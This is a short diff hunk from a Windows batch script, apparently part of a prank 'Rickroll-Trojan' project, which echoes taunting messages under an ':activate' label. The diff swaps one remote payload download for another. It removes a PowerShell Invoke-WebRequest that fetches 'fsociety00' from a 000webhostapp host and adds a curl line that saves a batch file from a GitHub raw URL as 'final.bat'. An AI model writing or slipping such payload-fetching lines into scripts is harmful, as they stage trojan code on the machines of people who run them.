@@ -52,8 +52,8 @@ cls
 exit
 :activate
 echo but trust me you won't escape this one
-echo PROJECT 00.DAT ACTIVATE!
-powershell -Command "Invoke-webRequest https://7241840012.000webhostapp.com/fsociety00 -Outfile fsociety00.dat"
+echo PROJECT 00.DAT ACTIVATE
+curl --outfile final.bat https://raw.githubusercontent.com/hellisabove/Rickroll-Trojan/main/fsociety00.bat
 cls
 pause
 cls
